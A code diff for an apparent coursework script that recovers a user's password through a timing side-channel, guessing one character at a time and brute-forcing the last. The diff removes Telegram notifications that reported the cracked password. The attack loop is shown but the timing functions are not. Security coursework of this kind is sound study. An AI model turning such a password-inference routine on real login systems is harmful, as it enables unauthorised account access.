@@ -5,7 +5,6 @@ import time
 import operator
 import sys
 from numpy import median, quantile
-import telegram_send
 
 # Our GitHub repo:
 # https://github.com/chendoy/temporal-side-channel-aoi
@@ -51,7 +50,6 @@ def timing_attack(params):
 	passwd_length = get_passwd_length(params)
 	eprint('Password length is', passwd_length)
 	curr_passwd = '*' * passwd_length
-	telegram_send.send(messages=[f'password: {curr_passwd}'])
 	for i in range(passwd_length-1): # -1 beacuse we brute-force last character
 		eprint('----------------------------------')
 		eprint('Current password:', curr_passwd)
@@ -60,7 +58,6 @@ def timing_attack(params):
 		next_char = infer_ith_char(params, i)
 		eprint(f'Best guess for index {i}:', next_char)
 		curr_passwd = curr_passwd[:i] + next_char + curr_passwd[i+1:]
-		telegram_send.send(messages=[f'password: {curr_passwd}'])
 	eprint('----------------------------------')
 	eprint('Current password:', curr_passwd)
 	eprint('Brute-forcing last character...')
@@ -70,10 +67,8 @@ def timing_attack(params):
 	eprint('----------------------------------')
 	if last_char != '*':
 		print(curr_passwd)
-		telegram_send.send(messages=[f'finished: {curr_passwd}'])
 	else: # Don't worry, try again
 		print('Starting over...')
-		telegram_send.send(messages=['starting over...'])
 		timing_attack(params)
 
 def get_session():
@@ -255,7 +250,6 @@ if __name__ == '__main__':
 		eprint('Usage: python3 ex01_M2.py <username> <difficulty>')
 		exit(1)
 	params = {'user': sys.argv[1], 'difficulty': sys.argv[2]}
-	telegram_send.send(messages=[f'{sys.argv[1]}: difficulty {sys.argv[2]}'])
 	start = time.time()
 	timing_attack(params)
 	end = time.time()
